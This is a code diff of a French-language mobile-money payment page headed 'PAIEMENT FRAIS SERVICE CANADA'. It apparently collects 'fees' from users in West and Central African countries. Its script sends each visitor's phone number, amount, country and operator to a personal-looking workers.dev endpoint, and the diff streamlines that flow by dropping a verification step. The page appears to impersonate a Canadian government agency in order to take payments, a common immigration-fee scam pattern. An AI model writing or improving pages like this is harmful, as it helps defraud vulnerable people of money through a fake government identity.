@@ -63,8 +63,8 @@
 
 <div class="box">
 
-  <!-- ✅ LOGO (INTÉGRÉ) -->
-  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." class="logo">
+  <!-- ✅ LOGO -->
+  <img src="logo.jpg" class="logo">
 
   <!-- TITRE -->
   <h2>PAIEMENT FRAIS SERVICE CANADA</h2>
@@ -72,8 +72,8 @@
   <select id="country" onchange="updateOperators()">
     <option value="CIV">Côte d'Ivoire</option>
     <option value="CMR">Cameroun</option>
-    <option value="COD">RDC (Congo Kinshasa)</option>
-    <option value="COG">Congo Brazzaville</option>
+    <option value="COD">RDC</option>
+    <option value="COG">Congo</option>
     <option value="GAB">Gabon</option>
     <option value="SEN">Sénégal</option>
     <option value="BEN">Bénin</option>
@@ -81,21 +81,16 @@
 
   <select id="operator"></select>
 
-  <input type="text" id="phone" placeholder="Numéro (ex: 229XXXXXXXX)">
+  <input type="text" id="phone" placeholder="Numéro">
   <input type="number" id="amount" placeholder="Montant">
 
   <button onclick="payer()">Payer maintenant</button>
-
-  <!-- 🔥 NOUVEAU -->
-  <button onclick="verifier()">Vérifier paiement</button>
 
   <p id="result"></p>
 
 </div>
 
 <script>
-
-let lastDepositId = null;
 
 const operators = {
   BEN: ["MTN", "MOOV"],
@@ -128,56 +123,33 @@ async function payer() {
 
   result.innerText = "⏳ Envoi de la demande...";
 
-  const depositId = crypto.randomUUID();
-  lastDepositId = depositId;
-
-  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      depositId,
-      phone: document.getElementById("phone").value,
-      amount: document.getElementById("amount").value,
-      country: document.getElementById("country").value,
-      operator: document.getElementById("operator").value
-    })
-  });
-
-  const data = await res.json();
-
-  if (data.status === "ACCEPTED") {
-    result.innerText = "📲 Validez le paiement sur votre téléphone puis cliquez sur 'Vérifier paiement'";
-  } else {
-    result.innerText = "❌ Erreur : " + (data.error || "Réessayez");
-  }
-}
-
-// 🔥 VÉRIFICATION RÉELLE
-async function verifier() {
-
-  const result = document.getElementById("result");
-
-  if (!lastDepositId) {
-    result.innerText = "⚠️ Aucun paiement à vérifier";
-    return;
-  }
-
-  result.innerText = "⏳ Vérification en cours...";
-
   try {
-    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/status?id=" + lastDepositId);
+
+    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phone: document.getElementById("phone").value,
+        amount: document.getElementById("amount").value,
+        country: document.getElementById("country").value,
+        operator: document.getElementById("operator").value
+      })
+    });
+
     const data = await res.json();
 
-    if (data.status === "SUCCESS") {
-      result.innerText = "✅ Paiement confirmé avec succès";
+    if (data.status === "ACCEPTED") {
+      result.innerText = "📲 Vérifiez votre téléphone pour valider le paiement";
     } else if (data.status === "PENDING") {
-      result.innerText = "⏳ Toujours en attente...";
+      result.innerText = "⏳ Paiement en attente...";
+    } else if (data.status === "SUCCESS") {
+      result.innerText = "✅ Paiement confirmé";
     } else {
       result.innerText = "❌ Paiement échoué";
     }
 
   } catch (err) {
-    result.innerText = "❌ Erreur de vérification";
+    result.innerText = "❌ Erreur réseau";
   }
 }
 
